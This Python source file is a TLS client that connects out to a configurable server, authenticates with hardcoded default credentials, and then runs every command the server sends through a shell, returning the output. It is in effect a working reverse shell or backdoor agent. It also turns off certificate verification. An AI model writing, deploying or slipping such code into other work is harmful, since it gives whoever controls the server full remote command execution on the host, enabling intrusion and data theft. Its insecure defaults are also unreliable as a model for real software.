import socket
import ssl
import subprocess
import logging
import os
from dotenv import load_dotenv
from time import sleep
from traceback import format_exc

# Load environment variables
load_dotenv()

# Client configuration
HOST = os.getenv('CLIENT_HOST', '127.0.0.1')
PORT = int(os.getenv('SERVER_PORT', 5000))
USERNAME = os.getenv('USERNAME', 'admin')
PASSWORD = os.getenv('PASSWORD', 'securepass123')

# Configure logging
logging.basicConfig(filename='client.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def connect_with_retry(max_retries=5, retry_delay=5):
    """Attempt to connect to the server with retries."""
    retries = 0
    while retries < max_retries:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            secure_socket = context.wrap_socket(client_socket, server_hostname=HOST)
            secure_socket.connect((HOST, PORT))
            secure_socket.settimeout(30)  # Set timeout
            logging.info(f"Connected to server at {HOST}:{PORT}")
            return secure_socket
        except (ConnectionError, ssl.SSLError) as e:
            retries += 1
            logging.warning(f"Connection attempt {retries}/{max_retries} failed: {e}")
            sleep(retry_delay)
    raise Exception("Failed to connect after maximum retries")

def client_program():
    """Main client function with retry and timeout support."""
    try:
        secure_socket = connect_with_retry()

        # Authentication
        username_prompt = secure_socket.recv(1024).decode()
        print(username_prompt, end='')
        secure_socket.send(USERNAME.encode())

        password_prompt = secure_socket.recv(1024).decode()
        print(password_prompt, end='')
        secure_socket.send(PASSWORD.encode())

        auth_response = secure_socket.recv(1024).decode()
        print(auth_response)
        if "failed" in auth_response.lower():
            raise Exception("Authentication failed")

        # Command execution loop
        while True:
            try:
                command = secure_socket.recv(1024).decode()
                if command.lower() == 'exit':
                    break

                try:
                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    output = result.decode()
                    logging.info(f"Executed command: {command}")
                except subprocess.CalledProcessError as e:
                    output = f"Error: {e.output.decode()}"
                    logging.error(f"Command '{command}' failed: {output}")
                except Exception as e:
                    output = f"Unexpected error: {e}"
                    logging.error(f"Unexpected error: {e}")

                secure_socket.send(output.encode())

            except socket.timeout:
                logging.error("Socket timeout, disconnecting")
                break
            except (ConnectionError, ssl.SSLError) as e:
                logging.error(f"Connection error: {e}\n{format_exc()}")
                break

    except Exception as e:
        logging.error(f"Client error: {e}\n{format_exc()}")
    finally:
        secure_socket.close()
        logging.info("Connection closed")

if __name__ == '__main__':
    client_program()